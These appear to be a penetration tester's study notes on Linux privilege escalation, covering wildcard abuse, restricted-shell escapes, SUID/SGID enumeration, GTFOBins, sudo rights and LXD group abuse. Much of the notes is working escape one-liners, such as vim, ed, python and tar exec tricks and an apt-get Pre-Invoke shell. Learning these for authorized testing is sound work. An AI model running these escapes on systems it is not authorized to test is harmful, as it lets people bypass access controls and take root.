
## Wildcard Abuse 

  > [!NOTE] 
> In Linux, characters like *, ?, and [...] are special globbing characters used to match filenames. When a command receives a wildcard, the shell expands it into a list of matching filenames before passing them to the command.


## Restricted Shell 

[resource 1](https://github.com/The-Red-Serpent/restricted-shell-escape-cheatsheet)

[resource 2](https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e) | 

[resource3](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)

|                                                                     |
| ------------------------------------------------------------------- |
| :!/bin/ls -l .b*  <br>:set shell=/bin/sh  <br>:shell  <br>!'/bin/sh |

**Pager Commands**
- Commands like more and less
- Open file long enough to fit on more than one screen and type !’sh’ inside at the bottom 
    
**Man and pinfo commands**
- pinfo ls
- Enter command ls /etc 
    

**Restricted Shell Checklist** 

```

#EDITORS --------------------

ed 

- if ed works, try 
    
- !’/bin/sh’
    

find / -perm -u=s -type f 2>/dev/null

vim 

- if vim works, try 
    
- :!/bin/ls -l .b*
    

  

#PAGER COMMANDS -------------

- Open file that takes up more than a page 
    
- Type !’sh’ inside it 
    
- Type less .bashrc 
    
- Type more .bashrc
    

  

man ls 

pinfo ls 

After entering pinfo menu, type [!]

  

#Check languages

python -c 'import os; os.system("/bin/sh")'  
  

python -c 'import pty; pty.spawn("/bin/bash")'

  

# OPERATORS -----------------------------

nano new-file   
  

cat existing file > new-file 

cat existing file | grep “” 

cat existing file >> new-file

  
  

/bin/bash  
  

/bin/sh  
  

cp /bin/bash ~/sh  
  

man nmap  
  

!/bin/bash  
  

find / -name test -exec /bin/bash \;  
  

tar cf /dev/null testfile -checkpoint=1 -checkpoint-action=exec=/bin/bash

  

ssh hackNos@<IP-Adress> -t "bash --noprofile"```                                                                          

```
## Set UID/SUID Permissions 

[resource-1](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) 

[resource-2](https://www.youtube.com/watch?v=718L9YuRUTY)
**Setuid:** permission found in linux that allows a user to execute script or action with the permissions of a user
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
**setgid:** Permission that lets us run binaries as if we were part of the group that created them. files can be enumerated using following command 
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```


**GTFO Bins**

[GTFO Bins](https://gtfobins.org/)
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Sudo Rights Abuse 

```bash
sudo -l 
```

## Privileged Groups 

[resource1](https://github.com/initstring/lxd_root/blob/master/lxd_rootv1.sh) 

[resource2](https://0toroot.com/learn/linux-privesc/lxd-lxc-privesc) 

[lxd-automation-script](https://github.com/M4rc0HR/lxd-privesc)

**LXD:** Similar to docker, ubuntu’s container manager 
- Can be abused to create file, browse mounted host and gain access to password hashes or SSH keys
- placing user in docker group is equivalent to root level access without password 
- To exploit, must have lxd or lxc group 
